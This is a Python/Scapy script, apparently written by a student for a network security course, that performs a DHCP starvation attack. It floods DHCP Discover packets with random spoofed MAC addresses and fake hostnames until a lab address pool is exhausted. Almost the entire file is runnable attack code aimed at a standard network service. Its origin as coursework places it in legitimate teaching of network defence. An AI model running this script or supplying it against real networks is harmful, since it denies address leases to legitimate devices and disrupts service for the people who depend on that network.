#!/usr/bin/env python3
# =============================================================
# Script   : DHCP Starvation Attack
# Autor    : Yeury Lopez
# Matricula: 2025-0780
# Materia  : Seguridad de Redes
# =============================================================

from scapy.all import *
import random
import time
import os
import sys

# -------------------------------------------------------------
# FUNCIÓN: Generar MAC address aleatoria
# -------------------------------------------------------------
def random_mac():
    return ':'.join(['{:02x}'.format(random.randint(0, 255))
                    for _ in range(6)])

# -------------------------------------------------------------
# FUNCIÓN: Generar hostname falso
# -------------------------------------------------------------
def random_hostname():
    nombres = ['laptop', 'desktop', 'phone', 'tablet',
               'pc', 'workstation', 'server', 'device']
    return f"{random.choice(nombres)}-{random.randint(100,999)}"

# -------------------------------------------------------------
# FUNCIÓN: Enviar DHCP Discover con MAC falsa
# -------------------------------------------------------------
def send_dhcp_discover(interface, src_mac, hostname):

    # Convertir MAC string a bytes para el campo chaddr
    mac_bytes = bytes.fromhex(src_mac.replace(':', ''))
    # Rellenar hasta 16 bytes (requerido por DHCP)
    mac_padded = mac_bytes + b'\x00' * 10

    paquete = (
        Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(
            chaddr=mac_padded,
            xid=random.randint(1, 0xFFFFFFFF),
            flags=0x8000
        ) /
        DHCP(options=[
            ("message-type", "discover"),
            ("hostname", hostname.encode()),
            ("param_req_list", [1, 3, 6, 15, 28, 51]),
            "end"
        ])
    )

    sendp(paquete, iface=interface, verbose=False)

# -------------------------------------------------------------
# FUNCIÓN PRINCIPAL: Ejecutar el ataque
# -------------------------------------------------------------
def dhcp_starvation(interface, packet_count):

    print("=" * 55)
    print("   DHCP STARVATION ATTACK")
    print("   Autor    : Yeury Lopez")
    print("   Matricula: 2025-0780")
    print("=" * 55)
    print(f"\n[*] Interfaz  : {interface}")
    print(f"[*] Paquetes  : {packet_count}")
    print(f"[*] Objetivo  : Agotar pool 172.25.78.50-100")
    print(f"[*] Inicio    : {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("-" * 55)

    paquetes_enviados = 0

    for i in range(packet_count):

        src_mac  = random_mac()
        hostname = random_hostname()

        send_dhcp_discover(interface, src_mac, hostname)

        paquetes_enviados += 1

        if paquetes_enviados % 10 == 0:
            print(f"[+] Enviados : {paquetes_enviados}/{packet_count} "
                  f"| MAC: {src_mac} | Host: {hostname}")

        # Pequeña pausa para no saturar la red
        time.sleep(0.1)

    print("-" * 55)
    print(f"[✓] Ataque completado")
    print(f"[✓] Total enviados : {paquetes_enviados}")
    print(f"[✓] Hora fin       : {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 55)

# -------------------------------------------------------------
# PUNTO DE ENTRADA
# -------------------------------------------------------------
if __name__ == "__main__":

    if os.getuid() != 0:
        print("[!] ERROR: Ejecuta como root (sudo)")
        sys.exit(1)

    INTERFAZ = "eth0"
    PAQUETES  = 60      # Pool tiene 51 IPs (.50 a .100)
                        # 60 garantiza agotar el pool

    dhcp_starvation(INTERFAZ, PAQUETES)
